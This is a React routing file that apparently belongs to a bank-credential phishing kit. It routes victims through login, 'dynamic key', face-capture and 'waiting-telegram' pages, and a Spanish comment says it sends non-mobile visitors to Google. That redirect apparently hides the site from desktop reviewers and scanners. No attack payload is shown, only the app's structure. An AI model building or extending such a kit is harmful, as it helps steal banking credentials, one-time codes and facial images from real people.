import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { useMobileDetect } from "@/hooks/useMobileDetect";
import NotFound from "@/pages/not-found";
import Login from "@/pages/login";
import Dashboard from "@/pages/dashboard";
import DynamicKey from "@/pages/dynamic-key";
import WaitingTelegram from "@/pages/waiting-telegram";
import TCC from "@/pages/tcc";
import Face from "@/pages/face";
import Call923 from "@/pages/call-923";

function Router() {
  return (
    <Switch>
      <Route path="/" component={Login} />
      <Route path="/waiting-telegram" component={WaitingTelegram} />
      <Route path="/dynamic-key" component={DynamicKey} />
      <Route path="/tcc" component={TCC} />
      <Route path="/face" component={Face} />
      <Route path="/call-923" component={Call923} />
      <Route path="/dashboard" component={Dashboard} />
      <Route component={NotFound} />
    </Switch>
  );
}

function AppContent() {
  // Verificar si es mobile, si no es mobile redirige a Google
  useMobileDetect();
  
  return <Router />;
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <AppContent />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
